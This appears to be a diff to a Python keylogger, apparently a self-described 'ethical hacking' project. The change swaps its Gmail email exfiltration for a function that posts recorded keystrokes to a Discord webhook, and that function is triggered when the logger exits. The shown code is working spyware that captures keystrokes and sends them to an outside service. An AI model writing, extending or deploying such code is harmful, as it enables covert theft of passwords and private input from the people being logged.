@@ -1,43 +1,28 @@
 import datetime
-import smtplib
 import os
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
+import requests
 from pynput import keyboard
 
 # key logging variables including file path to log file
 log_file = "key_presses.txt"
 keys_pressed = "" 
 
-def email_log_file(log_file):
-    # Information needed to send it
-    sender = os.environ["SENDER"]
-    receiver = os.environ["RECEIVER"]
-    password = os.environ["PASSWORD"]
+def send_log_to_discord():
+    webhook = os.environ["WEBHOOK_URL"]
 
-    # Builds the message
-    message = MIMEMultipart()
-    message["from"] = sender
-    message["to"] = receiver
-    message["subject"] = "Log file from ethical hacking keylogger project"
-
-    # Email body
     with open(log_file, "r") as f:
-        body = f.read()
-    
-    message.attach(MIMEText(body))
+        content = f.read()
 
-    # connect to the email server to send the email
-    try:
-        server = smtplib.SMTP("smtp.gmail.com",587)
-        server.starttls()
-        server.login(sender, password)
-        server.send_message(message)
-        print("Email sent successfully!")
-    except Exception as e:
-        print(f"Error: {e}")
-    finally:
-        server.quit()
+    if len(content) > 1900:
+        content = content[-1900:]
+
+    data = {"content": f"Log update:\n{content}"}
+    response = requests.post(webhook, json=data)
+    
+    if response.status_code == 204:
+        print("Log sent to Discord successfully!")
+    else:
+        print(f"Failed to send log. Status code: {response.status_code}")
 
 # Records key presses
 def on_press(key):
@@ -61,6 +46,7 @@ def on_release(key):
     
     if key == keyboard.Key.esc:
         print("Exiting keylogger...")
+        send_log_to_discord()
         return False
 
 # Keyboard listener
